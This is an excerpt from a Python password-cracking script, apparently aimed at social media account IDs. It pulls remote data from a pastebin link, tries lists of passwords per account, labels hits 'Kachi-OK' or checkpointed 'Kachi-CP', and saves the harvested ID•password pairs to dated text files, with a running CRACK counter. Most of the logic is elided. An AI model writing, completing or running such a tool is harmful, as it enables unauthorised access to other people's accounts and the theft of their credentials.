...
try:
    rq = requests.get('https://pastebin.com/0PXMetbt').text
            ...
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    ...
                    if fl.get("id") in files_ok:pass
                        ...
                        else:print("\r %s[%sKachi-OK%s] %s • %s%s          "%(H,P,H,fl.get("id"),i,tahun(fl.get("id"))))
                        self.ada.append("%s•%s"%(fl.get("id"),i));_azimvau_dapunta_(files_ok,"a+").write("%s•%s\n"%(fl.get("id"),i));break
                else:continue
            self.ko+=1
            print("\r %s[%sCRACK%s][%s%s/%s%s][%sKachi-OK:%s%s][%sKachi-CP:%s%s]%s"%(K,H,K,P,self.ko,len(self.fl),K,P,len(self.ada),K,P,len(self.cp),K,P), end='');sys.stdout.flush()
...
def started():
    ...
    print('%s [%s•%s] %s[%sKachi-OK%s] IDS SAVED IN >> %sKachi-OK/%s.txt'%(H,B,H,O,H,O,H,tanggal))
    print('%s [%s•%s] %s[%sKachi-CP%s] IDS SAVED IN >> %sKachi-CP/%s.txt'%(H,K,H,O,M,O,M,tanggal))
